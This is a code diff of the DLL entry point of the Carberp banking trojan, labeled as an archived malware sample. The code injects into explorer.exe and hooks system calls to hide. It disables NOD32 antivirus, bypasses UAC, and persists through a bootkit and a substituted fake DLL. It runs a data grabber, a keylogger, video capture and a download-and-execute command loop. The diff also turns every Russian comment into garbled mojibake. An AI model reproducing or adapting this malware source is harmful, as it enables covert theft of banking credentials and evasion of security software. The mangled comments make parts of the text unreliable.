@@ -1,4 +1,15 @@
-// dllmain.cpp: определяет точку входа для приложения DLL.
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
+// dllmain.cpp: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL.
 #include "stdafx.h"
 #include <windows.h>
 
@@ -31,7 +42,7 @@
 #pragma comment(linker, "/ENTRY:MyDllMain" )
 
 //------------------------------------------------------------------------------
-//  Система отладочных строк
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------------------------------
 #include "BotDebug.h"
 
@@ -48,23 +59,23 @@ namespace DLLDBGTEMPLATES
 
 //-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	
 
-WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
+WCHAR TempFileName[ MAX_PATH ]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-DWORD dwKillPid		 = 0; //пид для убийства процесса бота
-DWORD dwFirst	     = 0; //запуск в первый раз
-DWORD dwAlreadyRun   = 0; //если уже запущены
-DWORD dwGrabberRun	 = 0; //отработал ли граббер
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
+DWORD dwKillPid		 = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+DWORD dwFirst	     = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+DWORD dwAlreadyRun   = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwGrabberRun	 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwExplorerSelf = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD dwWebMoneySelf = 0;
 
-//глобальные переменные для хранения данных при запуске чере Fake.dll
-char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
-char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
-char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
-char FakeDllCryptKey[32]; //ключ для шифрования тела бота
-int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Fake.dll
+char FakeDllPathBot[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (bot.plug)
+char FakeDllPathDll[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ Fake.dll, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll
+char FakeDllPathOrigDll[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+char FakeDllCryptKey[32]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+int FakeDllLenCryptKey = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
-//DWORD dwExplorerPid  = 0; //пид эксплорера
+//DWORD dwExplorerPid  = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 DWORD WINAPI LoaderRoutine(LPVOID Data);
 
@@ -83,7 +94,7 @@ BOOL RunLoaderRoutine()
 
 BOOL RunVideoProcess()
 {
-	DLLDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
+	DLLDBG( "Main", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return MegaJump( VideoProcess::StartSvchost );
 }
 
@@ -97,13 +108,13 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 	switch( BOT::GetBotType() )
 	{
-		//если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ring3 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		case BotBootkit: 
 			BOT::UninstallService();
 			BOT::DeleteAutorunBot();
 			break;
 
-		// При запуске из под лоадера стартуем автообновление
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		case BotLoaderPlugin:
 			StartAutoUpdate();
 			break;
@@ -111,13 +122,13 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 	//UnhookDlls();
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 
-	// Инициализируем систему отправки статистической информации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 
-	// Вызываем событие
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Cancel = false;
 	SVChostStart(NULL, Cancel);
 	if (Cancel)
@@ -125,13 +136,13 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 		return 0; 
 	}
 
-	// 402_pl запуск цикла получения команд (он получается в другом процессе)
+	// 402_pl пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
 
-	// Запускаем поток отправки данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DataGrabber::StartDataSender();
 
-	// Стартуем поток обновления списка процессов кейлогера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef UniversalKeyLoggerH
 		KeyLogger::StartProcessListDownloader();
 	#endif
@@ -142,33 +153,33 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	#ifdef VideoRecorderH
 		#ifndef VideoProcessSvchost
 			if( VideoProcess::Start() )
-				DLLDBG( "Main", "Запустили видео процесс" );
+				DLLDBG( "Main", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			else
-				DLLDBG( "Main", "ERROR: не запустился видео процесс" );
+				DLLDBG( "Main", "ERROR: пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		#endif //VideoProcessSvchost
 	#endif
 
-	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
+	DLLDBG("====>Bot Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 	if (InitializeTaskManager(NULL, true))
 	{
 		while (true)
 		{
-			// 403_pl цикл получения команд
+			// 403_pl пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
 			
 			DownloadAndExecuteCommand(NULL, NULL);
 
-			// "Гениальность" проектирования взаимосвязи бота и его сервера
-			// отправка стартовой информации должна идти только после получения
-			// команды
+			// "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (!FirstSended)
 			{
-				DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
+				DLLDBG("====>Bot Loader", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 				FirstSended = SendFirstInfo();
 			}
 
 
-			// Приостанавливаем выполнение команд
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (!TaskManagerSleep(NULL))
 				break;
 		}
@@ -179,38 +190,38 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 DWORD WINAPI ExplorerMain(LPVOID Data)
 {
-	DLLDBG("====>Bot DLL", "Запускаем бот:\n Префикс [%s] \n WorkPath: %s", GetPrefix().t_str(), BOT::WorkPath().t_str());
+	DLLDBG("====>Bot DLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ:\n пїЅпїЅпїЅпїЅпїЅпїЅпїЅ [%s] \n WorkPath: %s", GetPrefix().t_str(), BOT::WorkPath().t_str());
 	
-	//копируем префикс из временного файла, который был сохранен инсталером буткита
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BOT::SavePrefixFromTemporaryFile(false);
 	//UnhookDlls();
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 	
-	// Инициализируем систему отправки статистической информации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
 
-	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
+	DLLDBG("====>Bot DLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Loader ()");
 	RunLoaderRoutine();
 
 	#ifdef VideoProcessSvchost
 		RunVideoProcess();
 	#endif
 
-	DLLDBG( "Main", "Отключаем NOD32" );
+	DLLDBG( "Main", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NOD32" );
 	OffNOD32();
 
-	// 401_pl запуск BotPlug
+	// 401_pl пїЅпїЅпїЅпїЅпїЅпїЅ BotPlug
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
 	
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun ) 
 		{
-			DLLDBG("====>Bot DLL", "Стартуем грабер");
+			DLLDBG("====>Bot DLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 			MegaJump( GrabberThread );
 		}
 	#endif
@@ -218,7 +229,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	//MegaJump(AvFuckThread);
 
 
-	// Вызываем событие мтарта експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 //	if (dwFirst)
 //		ExplorerFirstStart(NULL);
@@ -231,10 +242,10 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 }
 
 //-----------------------------------------------------------
-//  Start - Фуекция запускает плагин на выполнение.
-//          Вызов данной функции подразцмевает то, что dll 
-//          была загружена из памяти без вызова стартовой
-//          функции dll.
+//  Start - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//          пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ, пїЅпїЅпїЅ dll 
+//          пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//          пїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll.
 //-----------------------------------------------------------
 extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
 {
@@ -252,8 +263,8 @@ extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
 
 
 //-----------------------------------------------------------
-//  Start32 - Экспортируемая функция, запуска плагина
-//            в 32 разрядном процессе 
+//  Start32 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//            пїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 //-----------------------------------------------------------
 DWORD WINAPI Start32(LPVOID)
 {
@@ -267,7 +278,7 @@ DWORD WINAPI Start32(LPVOID)
 
 
 //-----------------------------------------------------------
-// MyDllMain - Точка входа DLL
+// MyDllMain - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ DLL
 //-----------------------------------------------------------
 BOOL APIENTRY MyDllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -279,13 +290,13 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 		case DLL_PROCESS_ATTACH:
 			BOT::Initialize(ProcessUnknown);
 #ifdef UAC_bypassH
-			//смотрим возможно ботплаг запустили после обхода UAC
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ UAC
 			if( ExecTaskAfterUAC() ) return TRUE;
 #endif //UAC_bypassH
 
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
-			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
+			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (explorer.exe)
 			{
 				if( BOT::CreateBootkitMutex())
 				{
@@ -306,17 +317,17 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 bool FakeDllDelete()
 {
 	BOT::DeleteBotFile(FakeDllPathBot);
-	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ), пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
 		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 	return true;
 }
 
-//функция физического удаления бота в отдельном процессе
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
 {
 	BOT::Initialize(ProcessUnknown);
-	pSleep(10 * 1000); //ждем некоторое время
+	pSleep(10 * 1000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
 	KillAllBrowsers();
 	pSleep(5 * 1000);
@@ -324,13 +335,13 @@ DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
 	return 0;
 }
 
-// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Explorer пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
 	BOT::Initialize(ProcessUnknown);
 	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
-	// При загрузке просто вызывает Start, предусмотренную для
-	// обычного запуска Bot.plug
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Start, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Bot.plug
 	BOT::SetBotType(BotFakeDll);
 	#ifdef IFobsH
 		RunThread( IFobs::KillIFobs, (void*)10 );
@@ -339,12 +350,12 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 	return 0;
 }
 
-// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
-// pathBotPlug - путь в котором находится этот бот
-// pathFakeDll - путь к fake.dll 
-// pathOrigDll - путь к длл которую подменили на fake.dll
-// cryptKey - ключ для шифрования тела бота при обновлении (строковая строка)
-// эти параметры необходимы для удаления и обновления бота
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Bot.plug пїЅпїЅ FakeDll.
+// pathBotPlug - пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+// pathFakeDll - пїЅпїЅпїЅпїЅ пїЅ fake.dll 
+// pathOrigDll - пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ fake.dll
+// cryptKey - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey )
 {
 //	BOT::Initialize();
@@ -359,19 +370,19 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s'", cryptKey );
 
-	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
+	if( BOT::BootkitIsRun() ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		MegaJump(DeleteFakeDllInSvchost);
 	}
 	else
 	{
-		// Смотрим на то - запущен ли бот
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
 		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
 
 		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
 		if (BotInstanceMutex )
 		{
-			pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
+			pCloseHandle(BotInstanceMutex); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ explorer.exe
 			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
 		}
 	}
